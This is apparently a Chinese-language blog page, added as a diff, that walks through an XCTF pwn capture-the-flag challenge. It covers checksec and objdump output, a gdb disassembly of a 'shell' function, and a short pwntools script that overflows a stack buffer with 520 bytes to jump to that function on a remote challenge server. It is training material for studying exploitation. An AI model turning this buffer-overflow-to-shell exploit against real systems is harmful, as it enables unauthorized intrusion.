@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta http-equiv="X-UA-Compatible" content="ie=edge" />
+<link rel="stylesheet" href="/_assets/main.css" />
+
+    <title>xctf--pwn--反应釜开关控制 - Dark&amp;Lord</title>
+  <link rel="stylesheet" href="/_markdown_plugin_assets/highlight.js/atom-one-light.css" /></head>
+  <body>
+    <div class="main">
+      <nav class="navigation">
+        <a href="/">Dark&amp;Lord</a>
+      </nav>
+      <article>
+        <header>
+          <h1 class="article-title">xctf--pwn--反应釜开关控制</h1>
+          <div class="article-info">
+            <div>
+              <span
+                >Created At：<time datetime="1662446833446"
+                  >2022</time
+                ></span
+              >
+              <span
+                >Updated At：<time datetime="1663120307054"
+                  >2022</time
+                ></span
+              >
+            </div>
+            
+          </div>
+        </header>
+        <div class="article-content markdown-body"><img src="/_resources/eeb968cf964d4de7a2fd6c9eef54a319.png" alt="513ca94d7d611e2b17e9dd4f3daa3617.png" width="800" height="326" class="jop-noMdConv" />
+<p>首先checksec查看保护</p>
+<div><pre class="hljs"><code><span class="hljs-string">└─#</span> <span class="hljs-string">checksec</span> <span class="hljs-string">ad72d90fbd4746ac8ea80041a1f661c2</span> 
+[<span class="hljs-string">*</span>] <span class="hljs-string">'/root/xctf/ad72d90fbd4746ac8ea80041a1f661c2'</span>
+    <span class="hljs-attr">Arch:</span>     <span class="hljs-string">amd64-64-little</span>
+    <span class="hljs-attr">RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span>
+    <span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span>
+    <span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span>
+    <span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x400000)</span></code></pre></div>
+<p>查看函数块</p>
+<div><pre class="hljs"><code>└─#  objdump -t -j .text ad72d90fbd4746ac8ea80041a1f661c2 
+
+ad72d90fbd4746ac8ea80041a1f661c2:     file format elf64-x86-<span class="hljs-number">64</span>
+
+SYMBOL TABLE:
+<span class="hljs-number">0000000000400500</span> l    d  .text  <span class="hljs-number">0000000000000000</span>              .text
+<span class="hljs-number">0000000000400530</span> l     F .text  <span class="hljs-number">0000000000000000</span>              deregister_tm_clones
+<span class="hljs-number">0000000000400570</span> l     F .text  <span class="hljs-number">0000000000000000</span>              register_tm_clones
+<span class="hljs-number">00000000004005b0</span> l     F .text  <span class="hljs-number">0000000000000000</span>              __do_global_dtors_aux
+<span class="hljs-number">00000000004005d0</span> l     F .text  <span class="hljs-number">0000000000000000</span>              frame_dummy
+<span class="hljs-number">0000000000400870</span> g     F .text  <span class="hljs-number">0000000000000002</span>              __libc_csu_fini
+<span class="hljs-number">0000000000400800</span> g     F .text  <span class="hljs-number">0000000000000065</span>              __libc_csu_init
+<span class="hljs-number">0000000000400500</span> g     F .text  <span class="hljs-number">000000000000002a</span>              _start
+<span class="hljs-number">00000000004006b0</span> g     F .text  <span class="hljs-number">00000000000000a9</span>              easy
+<span class="hljs-number">0000000000400759</span> g     F .text  <span class="hljs-number">0000000000000099</span>              main
+<span class="hljs-number">0000000000400607</span> g     F .text  <span class="hljs-number">00000000000000a9</span>              normal
+<span class="hljs-number">00000000004005f6</span> g     F .text  <span class="hljs-number">0000000000000011</span>              shell</code></pre></div>
+<p><strong>使用IDA对elf进行分析</strong></p>
+<p>首先是main函数：</p>
+<p><img src="/_resources/e510efe6fc1d4202a03d4ca087a42a30.png" /></p>
+<p>接下来是easy函数：</p>
+<p><img src="/_resources/2050828814ca48b183f9f1ce099605f8.png" /></p>
+<p>接下来是normal函数：</p>
+<p><img src="/_resources/0a5a30ed1f1b402686e4811ceaf687df.png" /></p>
+<p>最后是shell函数，执行该函数可以获得一个shell</p>
+<p><img src="/_resources/b51008c47c29432782555afa7ff918f4.png" /></p>
+<p>接下来进行分析</p>
+<p>按照题目要求是从V5变量溢出至easy函数，再V2变量溢出至normal函数，最后再溢出至shell函数</p>
+<p>但是由于该elf文件并未开启PIE保护（地址随机化），可以直接对main函数中的V5变量进行溢出至shell函数</p>
+<p>可见分析中V5变量的偏移地址为 [bp-200H]，即为十进制的512,故而v5变量距栈底距离长度为512</p>
+<p>再分析查看shel函数的起始地址，可见为0X4005f6</p>
+<div><pre class="hljs"><code>gdb-peda$ disass shell
+Dump of assembler code for function shell:
+   <span class="hljs-number">0x00000000004005f6</span> &lt;+<span class="hljs-number">0</span>&gt;:     <span class="hljs-keyword">push</span>   <span class="hljs-built_in">rbp</span>
+   <span class="hljs-number">0x00000000004005f7</span> &lt;+<span class="hljs-number">1</span>&gt;:     <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rbp</span>,<span class="hljs-built_in">rsp</span>
+   <span class="hljs-number">0x00000000004005fa</span> &lt;+<span class="hljs-number">4</span>&gt;:     <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">edi</span>,<span class="hljs-number">0x400888</span>
+   <span class="hljs-number">0x00000000004005ff</span> &lt;+<span class="hljs-number">9</span>&gt;:     <span class="hljs-keyword">call</span>   <span class="hljs-number">0x4004b0</span> &lt;system@plt&gt;
+   <span class="hljs-number">0x0000000000400604</span> &lt;+<span class="hljs-number">14</span>&gt;:    <span class="hljs-keyword">nop</span>
+   <span class="hljs-number">0x0000000000400605</span> &lt;+<span class="hljs-number">15</span>&gt;:    <span class="hljs-keyword">pop</span>    <span class="hljs-built_in">rbp</span>
+   <span class="hljs-number">0x0000000000400606</span> &lt;+<span class="hljs-number">16</span>&gt;:    <span class="hljs-keyword">ret</span>    
+End of assembler dump.</code></pre></div>
+<p>所以 padyload为<code>bytes('a',encoding='utf8')*520+shell_address</code></p>
+<p>exp如下：</p>
+<div><pre class="hljs"><code><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+
+key = p64(<span class="hljs-number">0x4005f6</span>)
+
+conn = remote(<span class="hljs-string">'61.147.171.105'</span>,<span class="hljs-number">63873</span>)
+
+conn.recvuntil(<span class="hljs-string">'&gt;'</span>)
+
+payload = <span class="hljs-built_in">bytes</span>(<span class="hljs-string">'a'</span>,encoding=<span class="hljs-string">'utf8'</span>)*<span class="hljs-number">520</span>+key
+
+conn.sendline(payload)
+
+conn.interactive()</code></pre></div>
+<p>运行结果如下，成功获取flag：</p>
+<p><img src="/_resources/c3df518e23064ddd91ca9769f9c124b8.png" /></p>
+</div>
+      </article>
+    </div>
+  </body>
+</html>
